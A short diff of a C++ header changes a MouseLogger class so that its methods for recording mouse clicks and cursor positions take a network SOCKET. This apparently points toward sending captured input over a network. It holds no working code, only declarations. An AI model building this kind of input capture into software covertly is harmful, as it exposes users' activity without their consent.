@@ -12,6 +12,6 @@ public:
 	MouseLogger();
 	~MouseLogger();
 
-	void recordMouseClicks();
-	void recordMousePos();
+	void recordMouseClicks(SOCKET sock);
+	void recordMousePos(SOCKET sock);
 };
